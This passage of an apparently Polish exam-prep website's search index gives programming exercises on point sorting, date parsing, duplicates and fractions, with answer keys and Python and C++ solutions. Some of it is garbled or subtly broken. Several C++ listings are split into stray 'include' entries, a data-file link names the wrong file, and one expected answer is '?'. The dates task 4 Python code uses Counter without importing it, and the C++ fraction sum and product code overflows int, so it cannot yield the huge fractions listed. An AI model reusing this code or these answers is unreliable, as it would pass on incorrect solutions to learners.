0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/circle-and-square/solutions/#zadanie-4","title":"Zadanie 4","text":"PythonC++ <pre><code>with open(\"kik.txt\") as file:\n    points = [list(map(float, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n\npoints = points[:100]\npoints = [[int(point[0] * 1000), int(point[1] * 1000)] for point in points]\nfor i in range(len(points)):\n    for j in range(1, len(points) - i):\n        x1 = points[j][0]\n        y1 = points[j][1]\n        x2 = points[j - 1][0]\n        y2 = points[j - 1][1]\n        if x1 &lt; x2 or (x1 == x2 and y1 &lt; y2):\n            points[j - 1][0], points[j][0] = points[j][0], points[j - 1][0]\n            points[j - 1][1], points[j][1] = points[j][1], points[j - 1][1]\n\nwith open(\"kik_posortowane.txt\", \"w\") as out_file:\n    for point in points:\n        print(point[0], point[1], file=out_file)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;cmath&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"kik.txt\");\n    double x, y;\n    int points[100][2];\n    for(int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; x &gt;&gt; y;\n        points[i][0] = x * 1000;\n        points[i][1] = y * 1000;\n    }\n\n    file.close();\n\n    for(int i = 0; i &lt; 100; i++) {\n        for(int j = 1; j &lt; 100 - i; j++) {\n            if(points[j][0] &lt; points[j - 1][0] || (points[j][0] == points[j - 1][0] &amp;&amp; points[j][1] &lt; points[j - 1][1])) {\n                swap(points[j - 1][0], points[j][0]);\n                swap(points[j - 1][1], points[j][1]);\n            }\n        }\n    }\n\n    ofstream out_file(\"kik_posortowane.txt\");\n    for(int i = 0; i &lt; 100; i++) {\n        out_file &lt;&lt; points[i][0] &lt;&lt; \" \" &lt;&lt; points[i][1] &lt;&lt; endl;\n    }\n\n    out_file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/","title":"Daty","text":"<p>W pliku dates.txt znajduje si\u0119 1000 linii, ka\u017cda zawieraj\u0105ca trzy liczby naturalne oddzielone spacj\u0105. Liczby te reprezentuj\u0105 daty. Rok jest liczb\u0105 naturaln\u0105 z przedzia\u0142u od 100 do 3000, miesi\u0105c jest liczb\u0105 naturaln\u0105 z przedzia\u0142u od 1 do 12, a dzie\u0144 jest liczb\u0105 naturaln\u0105 z przedzia\u0142u od 1 do 31. Daty podane s\u0105 w losowej kolejno\u015bci, tzn. nie wiadomo, na kt\u00f3rym miejscu wyst\u0119puje dzie\u0144, miesi\u0105c i rok.</p> <p> dates.txt</p> <p>Plik dates_test.txt zawiera 100 linii tak jak opisano powy\u017cej.</p> <p> dates_test.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-1","title":"Zadanie 1","text":"<p>Oblicz ile dat z pliku zawiera rok przest\u0119pny. Rok przest\u0119pny to taki, kt\u00f3ry dzieli si\u0119 przez 4, ale nie dzieli si\u0119 przez 100, chyba \u017ce r\u00f3wnie\u017c dzieli si\u0119 przez 400.</p> <p>Dla pliku dates_test.txt odpowied\u017a to 18.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-2","title":"Zadanie 2","text":"<p>W podanych w pliku datach mo\u017cemy \u0142atwo stwierdzi\u0107, kt\u00f3ra z warto\u015bci reprezentuje rok, jednak kt\u00f3ra z pozosta\u0142ych dw\u00f3ch liczb reprezentuje miesi\u0105c, a kt\u00f3ra dzie\u0144, nie zawsze jest mo\u017cliwe do stwierdzenia. Je\u017celi jedna z tych dw\u00f3ch liczb jest warto\u015bci\u0105 wi\u0119ksz\u0105 nie\u017c 12, to wiemy, \u017ce musi reprezentowa\u0107 dzie\u0144. Powiemy w\u00f3wczas, \u017ce interpretacja takiej daty jest jednoznaczna. Oblicz, ile dat z pliku ma jednoznaczn\u0105 interpretacj\u0119.</p> <p>Dla pliku dates_test.txt odpowied\u017a to 52.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-3","title":"Zadanie 3","text":"<p>Dla ka\u017cdej daty przyjmij nast\u0119puj\u0105c\u0105 interpretacj\u0119: najwi\u0119ksza liczba to rok, najmniejsza to miesi\u0105c, a \u015brodkowa to dzie\u0144. Podaj najstarsz\u0105 i najm\u0142odsz\u0105 dat\u0119.</p> <p>Dla pliku dates_test.txt odpowied\u017a to:</p> <ul> <li>najstarsza data: 03-03-105</li> <li>najm\u0142odsza data: 25-12-3000</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-4","title":"Zadanie 4","text":"<p>Przyjmuj\u0105c interpretacj\u0119 dat z zadania 3, podaj miesi\u0105c, kt\u00f3ry najcz\u0119\u015bciej wyst\u0119puje w zestawieniu. Je\u017celi jest takich kilka, podaj wszystkie. Podaj tak\u017ce, ile razy wyst\u0105pi\u0142.</p> <p>Dla pliku dates_test.txt odpowied\u017a to:</p> <ul> <li>miesi\u0105c, kt\u00f3ry najcz\u0119\u015bciej wyst\u0119puje: 1</li> <li>liczba wyst\u0105pie\u0144: 13</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-5","title":"Zadanie 5","text":"<p>Sp\u00f3jnym podci\u0105giem rosn\u0105cym nazwiemy ci\u0105g wyst\u0119puj\u0105cych bezpo\u015brednio po sobie kolejnych element\u00f3w, taki \u017ce ka\u017cdy kolejny element jest wi\u0119kszy pod poprzedniego. </p> <p>Patrz\u0105c wy\u0142\u0105cznie na lata, podaj d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego, kt\u00f3ry tworz\u0105 kolejne lata. Podaj pierwszy i ostatni rok w takim podci\u0105gu. Je\u017celi jest kilka takich podci\u0105g\u00f3w, podaj pierwszy z nich, zgodnie z kolejno\u015bci\u0105 w pliku.</p> <p>Dla pliku dates_test.txt odpowied\u017a to:</p> <ul> <li>d\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego: 4</li> <li>pierwszy rok: 372</li> <li>ostatni rok: 2834</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/#zadanie-6","title":"Zadanie 6","text":"<p>Przyjmuj\u0105c interpretacj\u0119 dat z zadania 3, podaj ile jest par dat, \u017ce jak zsumujemy ich miesi\u0105ce i zsumujemy ich dni to dostaniemy warto\u015bci mieszcz\u0105ce si\u0119 w zakresach odpowiednio \\([1,12]\\) oraz \\([1,31]\\).</p> <p>Dla pliku dates_test.txt odpowied\u017a to 1909.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-1","title":"Zadanie 1","text":"<p>234</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-2","title":"Zadanie 2","text":"<p>623</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-3","title":"Zadanie 3","text":"<p>Najstarsza: 20-5-100 Najm\u0142odsza: 8-7-2997</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-4","title":"Zadanie 4","text":"<ul> <li>Miesi\u0105c, kt\u00f3ry najcz\u0119\u015bciej wyst\u0119puje: 1</li> <li>Liczba wyst\u0105pie\u0144: 108</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-5","title":"Zadanie 5","text":"<ul> <li>D\u0142ugo\u015b\u0107 najd\u0142u\u017cszego sp\u00f3jnego podci\u0105gu rosn\u0105cego: 6</li> <li>Pierwszy rok: 147</li> <li>Ostatni rok: 2526</li> </ul>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/answers/#zadanie-6","title":"Zadanie 6","text":"<p>149137</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nfor date in dates:\n    year = max(date)\n    if (year % 4 == 0 and year % 100 != 0) or (year % 400 == 0):\n        result += 1\n\nprint(result)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"dates.txt\");\n    int result = 0, a, b, c, year;\n    for(int i = 0; i &lt; 1000; i++) {\n        file &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n        year = max(a, max(b, c));\n        if ((year % 4 == 0 &amp;&amp; year % 100 != 0) || (year % 400 == 0)) {\n            result++;\n        }\n    }\n\n    file.close();\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nfor date in dates:\n    year = max(date)\n    date.remove(year)\n    day = max(date)\n    if day &gt; 12:\n        result += 1\n\nprint(result)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"dates.txt\");\n    int result = 0, a, b, c, year, month, day;\n    for(int i = 0; i &lt; 1000; i++) {\n        file &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n        year = max(a, max(b, c));\n        month = min(a, min(b, c));\n        day = a + b + c - year - month;\n        if (day &gt; 12) {\n            result++;\n        }\n    }\n\n    file.close();\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-3","title":"Zadanie 3","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nordered_dates = []\nfor date in dates:\n    month, day, year = sorted(date)\n    ordered_dates.append((year, month, day))\n\nordered_dates.sort()\nprint(\"Najstarsza:\", ordered_dates[0])\nprint(\"Najm\u0142odsza:\", ordered_dates[-1])\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n#include &lt;tuple&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"dates.txt\");\n    int a, b, c, year, month, day;\n    tuple&lt;int, int, int&gt; dates[1000];\n    for(int i = 0; i &lt; 1000; i++) {\n        file &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n        year = max(a, max(b, c));\n        month = min(a, min(b, c));\n        day = a + b + c - year - month;\n        dates[i] = make_tuple(year, month, day);\n    }\n\n    file.close();\n\n    sort(dates, dates + 1000);\n\n    cout &lt;&lt; \"Najstarsza: \" &lt;&lt; get&lt;0&gt;(dates[0]) &lt;&lt; \" \" &lt;&lt; get&lt;1&gt;(dates[0]) &lt;&lt; \" \" &lt;&lt; get&lt;2&gt;(dates[0]) &lt;&lt; endl;\n    cout &lt;&lt; \"Najmlodsza: \" &lt;&lt; get&lt;0&gt;(dates[999]) &lt;&lt; \" \" &lt;&lt; get&lt;1&gt;(dates[999]) &lt;&lt; \" \" &lt;&lt; get&lt;2&gt;(dates[999]) &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-4","title":"Zadanie 4","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nmonths = [min(date) for date in dates]\nmonths_count = Counter(months)\nprint(months_count)\n</code></pre> <p>```cpp linenums=\"1\"</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#include","title":"include","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#include_1","title":"include  <p>using namespace std;</p> <p>int main() {     ifstream file(\"dates.txt\");     int a, b, c, month;     int months_count[13] = {};     for(int i = 0; i &lt; 1000; i++) {         file &gt;&gt; a &gt;&gt; b &gt;&gt; c;         month = min(a, min(b, c));         months_count[month]++;     }</p> <pre><code>file.close();\n\nfor(int i = 1; i &lt;= 12; i++) {\n    cout &lt;&lt; i &lt;&lt; \": \" &lt;&lt; months_count[i] &lt;&lt; endl;\n}\n\nreturn 0;\n</code></pre> <p>}</p>","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-5","title":"Zadanie 5","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nyears = [max(date) for date in dates]\ncurrent_length = 1\ncurrent_start_year = years[0]\nmax_start_year = years[0]\nmax_end_year = years[0]\nmax_length = 1\nfor i, year in enumerate(years[1:], 1):\n    if year &gt; years[i - 1]:\n        current_length += 1\n        if current_length &gt; max_length:\n            max_length = current_length\n            max_start_year = current_start_year\n            max_end_year = year\n    else:\n        current_start_year = year\n        current_length = 1\n\nprint(\"D\u0142ugo\u015b\u0107:\", max_length)\nprint(\"Rok startowy:\", max_start_year)\nprint(\"Rok ko\u0144cowy:\", max_end_year)\n</code></pre> <p>```cpp linenums=\"1\"</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#include_2","title":"include","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#include_3","title":"include  <p>using namespace std;</p> <p>int main() {     ifstream file(\"dates.txt\");     int a, b, c, current_year, previous_year, result = 0;     int current_length = 1, max_length = 1, current_start_year, max_start_year, max_end_year;     file &gt;&gt; a &gt;&gt; b &gt;&gt; c;     current_year = max(a, max(b, c));     current_start_year = current_year;     max_start_year = current_year;     max_end_year = current_year;     for(int i = 1; i &lt; 1000; i++) {         previous_year = current_year;         file &gt;&gt; a &gt;&gt; b &gt;&gt; c;         current_year = max(a, max(b, c));         if(current_year &gt; previous_year) {             current_length += 1;             if(current_length &gt; max_length) {                 max_length = current_length;                 max_start_year = current_start_year;                 max_end_year = current_year;             }         } else {             current_start_year = current_year;             current_length = 1;         }     }</p> <pre><code>file.close();\n\ncout &lt;&lt; \"Dlugosc: \" &lt;&lt; max_length &lt;&lt; endl;\ncout &lt;&lt; \"Rok startowy: \" &lt;&lt; max_start_year &lt;&lt; endl;\ncout &lt;&lt; \"Rok koncowy: \" &lt;&lt; max_end_year &lt;&lt; endl;\n\nreturn 0;\n</code></pre> <p>}</p>","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/dates/solutions/#zadanie-6","title":"Zadanie 6","text":"PythonC++ <pre><code>with open(\"dates.txt\") as file:\n    dates = [list(map(int, line.split())) for line in file.read().strip().split(\"\\n\")]\n\nresult = 0\nordered_dates = []\nfor date in dates:\n    month, day, year = sorted(date)\n    ordered_dates.append((year, month, day))\n\nresult = 0\nfor i, date1 in enumerate(ordered_dates):\n    for date2 in ordered_dates[i + 1:]:\n        year1, month1, day1 = date1\n        year2, month2, day2 = date2\n        if month1 + month2 &lt;= 12 and day1 + day2 &lt;= 31:\n            result += 1\n\nprint(result)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;algorithm&gt;\n#include &lt;tuple&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"dates.txt\");\n    int a, b, c, year, month, day, result = 0;\n    tuple&lt;int, int, int&gt; dates[1000];\n    for(int i = 0; i &lt; 1000; i++) {\n        file &gt;&gt; a &gt;&gt; b &gt;&gt; c;\n        year = max(a, max(b, c));\n        month = min(a, min(b, c));\n        day = a + b + c - year - month;\n        dates[i] = make_tuple(year, month, day);\n    }\n\n    file.close();\n\n    for(int i = 0; i &lt; 1000; i++) {\n        for(int j = i + 1; j &lt; 1000; j++) {\n            if (get&lt;1&gt;(dates[i]) + get&lt;1&gt;(dates[j]) &lt;= 12 &amp;&amp; get&lt;2&gt;(dates[i]) + get&lt;2&gt;(dates[j]) &lt;= 31)\n                result++;\n        }\n    }\n\n    cout &lt;&lt; result &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/","title":"Duplikaty","text":"<p>W pliku duplicates.txt znajduje si\u0119 \\(100\\) liczb ca\u0142kowitych z przedzia\u0142u \\([1,100]\\), ka\u017cda zapisana w osobnym wierszu.</p> <p> parentheses.txt</p> <p>W pliku duplicates_test.txt znajduje si\u0119 \\(10\\) liczb ca\u0142kowitych z przedzia\u0142u \\([1,10]\\), ka\u017cda zapisana w osobnym wierszu.</p> <p> parentheses_test.txt</p> <p>Napisz program/programy rozwi\u0105zuj\u0105ce poni\u017csze zadania.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/#zadanie-1","title":"Zadanie 1","text":"<p>Podaj ile pozostanie warto\u015bci w pliku duplicates.txt po usuni\u0119ciu duplikat\u00f3w. Dla pliku duplicates_test.txt poprawny wynik to \\(7\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/#zadanie-2","title":"Zadanie 2","text":"<p>Podaj najwi\u0119ksz\u0105 liczb\u0119, kt\u00f3ra wyst\u0105pi\u0142a w pliku duplicates.txt najwi\u0119ksz\u0105 liczb\u0119 razy. Dla pliku duplicates_test.txt poprawny wynik to \\(7\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/#zadanie-3","title":"Zadanie 3","text":"<p>Podaj najmniejsz\u0105 liczb\u0119, kt\u00f3ra wyst\u0105pi\u0142a w pliku duplicates.txt najmniejsz\u0105 liczb\u0119 razy. Dla pliku duplicates_test.txt poprawny wynik to \\(2\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/#zadanie-4","title":"Zadanie 4","text":"<p>Podaj, ile liczb z pliku duplicates.txt jest liczb\u0105 pierwsz\u0105. Dla pliku duplicates_test.txt poprawny wynik to \\(7\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/#zadanie-5","title":"Zadanie 5","text":"<p>Podaj d\u0142ugo\u015b\u0107 najd\u0142u\u017cszej sekwencji kolejnych warto\u015bci z pliku duplicates.txt, w kt\u00f3rej \u017cadne dwie liczby si\u0119 nie powtarzaj\u0105. Dla pliku duplicates_test.txt poprawny wynik to \\(?\\).</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>65\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/answers/#zadanie-2","title":"Zadanie 2","text":"<pre><code>60\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/answers/#zadanie-3","title":"Zadanie 3","text":"<pre><code>2\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/answers/#zadanie-4","title":"Zadanie 4","text":"<pre><code>20\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>with open(\"duplicates.txt\") as file:\n    duplicates = list(map(int, file.read().split()))\n\nuniques = set(duplicates)\n\nprint(len(uniques))\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;set&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"duplicates.txt\");\n    int num;\n    set&lt;int&gt; uniques;\n    for(int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; num;\n        uniques.insert(num);\n    }\n\n    file.close();\n\n    cout &lt;&lt; uniques.size() &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>with open(\"duplicates.txt\") as file:\n    duplicates = list(map(int, file.read().split()))\n\ncounters = [0] * 101\nfor num in duplicates:\n    counters[num] += 1\n\nmax_count = max(counters)\nfor i in range(100, 0, -1):\n    if counters[i] == max_count:\n        print(i)\n        break\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"duplicates.txt\");\n    int num, max_count, max_count_num;\n    int counters[101] = {};\n    for(int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; num;\n        counters[num]++;\n    }\n\n    file.close();\n\n    max_count = counters[100];\n    max_count_num = 100;\n    for(int i = 99; i &gt;= 1; i--) {\n        if (counters[i] &gt; max_count) {\n            max_count = counters[i];\n            max_count_num = i;\n        }\n    }\n\n    cout &lt;&lt; max_count_num &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/duplicates/solutions/#zadanie-3","title":"Zadanie 3","text":"PythonC++ <pre><code>with open(\"duplicates.txt\") as file:\n    duplicates = list(map(int, file.read().split()))\n\ncounters = [0] * 101\nfor num in duplicates:\n    counters[num] += 1\n\nmin_count = min(counters)\nfor i in range(1, 101):\n    if counters[i] == min_count:\n        print(i)\n        break\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"duplicates.txt\");\n    int num, min_count, min_count_num;\n    int counters[101] = {};\n    for(int i = 0; i &lt; 100; i++) {\n        file &gt;&gt; num;\n        counters[num]++;\n    }\n\n    file.close();\n\n    min_count = counters[1];\n    min_count_num = 1;\n    for(int i = 2; i &lt;= 100; i++) {\n        if (counters[i] &lt; min_count) {\n            min_count = counters[i];\n            min_count_num = i;\n        }\n    }\n\n    cout &lt;&lt; min_count_num &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/","title":"U\u0142amki","text":"<p>W pliku ulamki.txt znajduje si\u0119 \\(100\\) par liczb ca\u0142kowitych. Ka\u017cda linia w pliku zawiera dwie liczby oddzielone spacj\u0105. Pierwsza liczba z pary oznacza licznik u\u0142amka, a druga jego mianownik. Postaci\u0105 skr\u00f3con\u0105 u\u0142amka zwyk\u0142ego nazwiemy tak\u0105 posta\u0107, \u017ce nie istnieje taka liczba naturalna wi\u0119ksza od \\(1\\), przez kt\u00f3r\u0105 bez reszty dzieli si\u0119 zar\u00f3wno licznik jak i mianownik.</p> <p> ulamki.txt</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/#zadanie-1","title":"Zadanie 1","text":"<p>Przedstaw ka\u017cdy u\u0142amek z pliku w postaci skr\u00f3conej. Otrzymane u\u0142amki zapisz w pliku skrocone.txt. W ka\u017cdej linii pliku powinny znale\u017a\u0107 si\u0119 dwie warto\u015bci: licznik i mianownik oddzielone spacj\u0105.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/#zadanie-2","title":"Zadanie 2","text":"<p>Oblicz sum\u0119 wszystkich u\u0142amk\u00f3w z pliku. Wynik przedstaw jako u\u0142amek zwyk\u0142y w postaci skr\u00f3conej.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/#zadanie-3","title":"Zadanie 3","text":"<p>Oblicz iloczyn wszystkich u\u0142amk\u00f3w z pliku. Wynik przedstaw jako u\u0142amek zwyk\u0142y w postaci skr\u00f3conej.</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/answers/","title":"Odpowiedzi","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/answers/#zadanie-1","title":"Zadanie 1","text":"<pre><code>1 3\n15 8\n21 11\n16 1\n9 1\n9 5\n3 1\n3 4\n10 11\n23 20\n3 2\n10 17\n5 7\n3 2\n22 15\n1 5\n24 7\n25 8\n12 1\n7 3\n5 2\n1 16\n1 1\n6 1\n7 10\n13 5\n3 11\n19 2\n15 8\n1 1\n1 17\n7 11\n27 11\n1 16\n13 5\n6 1\n15 13\n1 7\n1 1\n2 1\n7 20\n25 1\n5 3\n18 11\n8 1\n7 1\n18 1\n21 19\n10 11\n6 1\n6 5\n29 9\n1 3\n7 18\n7 4\n9 8\n1 1\n28 3\n3 10\n1 1\n11 4\n26 1\n2 3\n2 3\n28 13\n3 7\n13 10\n5 16\n26 5\n19 3\n5 3\n25 13\n8 3\n10 1\n25 11\n3 7\n27 1\n2 9\n3 4\n9 10\n13 1\n11 8\n26 19\n5 7\n13 10\n7 18\n2 1\n1 1\n29 17\n17 20\n19 7\n14 9\n7 1\n14 1\n3 5\n23 19\n2 1\n1 20\n9 7\n4 3\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/answers/#zadanie-2","title":"Zadanie 2","text":"<p>Suma u\u0142amk\u00f3w: \\(\\frac{7271917729}{21162960}\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/answers/#zadanie-3","title":"Zadanie 3","text":"<p>Iloczyn u\u0142amk\u00f3w: \\(\\frac{98818570351733115048023210625}{95321577472}\\)</p>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/solutions/","title":"Rozwi\u0105zania","text":""},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/solutions/#zadanie-1","title":"Zadanie 1","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"ulamki.txt\", \"r\") as file:\n    fractions = [list(map(int, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n    with open(\"skrocone.txt\", \"w\") as out_file:\n        for fraction in fractions:\n            divisor = gcd(fraction[0], fraction[1])\n            fraction[0] //= divisor\n            fraction[1] //= divisor\n            print(f\"{fraction[0]} {fraction[1]}\", file=out_file)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;sstream&gt;\n#include &lt;numeric&gt; // For std::gcd\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"ulamki.txt\");\n    ofstream out_file(\"skrocone.txt\");\n\n    int numerator, denumerator;\n\n    while (file &gt;&gt; numerator &gt;&gt; denumerator &amp;&amp; !file.eof()) {\n        int divisor = gcd(numerator, denumerator);\n        numerator /= divisor;\n        denumerator /= divisor;\n        out_file &lt;&lt; numerator &lt;&lt; \" \" &lt;&lt; denumerator &lt;&lt; endl;\n    }\n\n    file.close();\n    out_file.close();\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/solutions/#zadanie-2","title":"Zadanie 2","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"ulamki.txt\", \"r\") as file:\n    fractions = [list(map(int, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n    numerator = fractions[0][0]\n    denumerator = fractions[0][1]\n    fractions.pop(0)\n    for fraction in fractions:\n        m1 = denumerator\n        m2 = fraction[1]\n        numerator *= m2\n        denumerator *= m2\n        numerator += fraction[0] * m1\n\n    divisor = gcd(numerator, denumerator)\n    numerator //= divisor\n    denumerator //= divisor\n    print(numerator, denumerator)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;sstream&gt;\n#include &lt;numeric&gt; // For std::gcd\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"ulamki.txt\");\n\n    int numerator, denumerator, num, den;\n    file &gt;&gt; numerator &gt;&gt; denumerator;\n\n    while (file &gt;&gt; num &gt;&gt; den &amp;&amp; !file.eof()) {\n        int tmp = denumerator;\n        numerator *= den;\n        denumerator *= den;\n        numerator += num * tmp;\n    }\n\n    file.close();\n\n    int divisor = gcd(numerator, denumerator);\n    numerator /= divisor;\n    denumerator /= divisor;\n\n    cout &lt;&lt; numerator &lt;&lt; \" \" &lt;&lt; denumerator &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/fractions/solutions/#zadanie-3","title":"Zadanie 3","text":"PythonC++ <pre><code>from math import gcd\n\nwith open(\"ulamki.txt\", \"r\") as file:\n    fractions = [list(map(int, str.split(\" \"))) for str in file.read().split(\"\\n\")]\n    numerator = fractions[0][0]\n    denumerator = fractions[0][1]\n    fractions.pop(0)\n    for fraction in fractions:\n        numerator *= fraction[0]\n        denumerator *= fraction[1]\n\n    divisor = gcd(numerator, denumerator)\n    numerator //= divisor\n    denumerator //= divisor\n    print(numerator, denumerator)\n</code></pre> <pre><code>#include &lt;iostream&gt;\n#include &lt;fstream&gt;\n#include &lt;vector&gt;\n#include &lt;sstream&gt;\n#include &lt;numeric&gt; // For std::gcd\n\nusing namespace std;\n\nint main() {\n    ifstream file(\"ulamki.txt\");\n\n    int numerator, denumerator, num, den;\n    file &gt;&gt; numerator &gt;&gt; denumerator;\n\n    while (file &gt;&gt; num &gt;&gt; den &amp;&amp; !file.eof()) {\n        numerator *= num;\n        denumerator *= den;\n    }\n\n    file.close();\n\n    int divisor = gcd(numerator, denumerator);\n    numerator /= divisor;\n    denumerator /= divisor;\n\n    cout &lt;&lt; numerator &lt;&lt; \" \" &lt;&lt; denumerator &lt;&lt; endl;\n\n    return 0;\n}\n</code></pre>"},{"location":"matura-z-informatyki/przygotowanie/programming/groceries/","title":"Zakupy","text":"<p>W pliku groceries.txt znajduje si\u0119 1000 linii, kt\u00f3re zawieraj\u0105 informacje na temat pewnych zakup\u00f3w. W ka\u017cdej linii znajduj\u0105 si\u0119 trzy warto\u015bci oddzielone spacj\u0105:</p> <ul> <li>nazwa produktu - tekst sk\u0142adaj\u0105cy 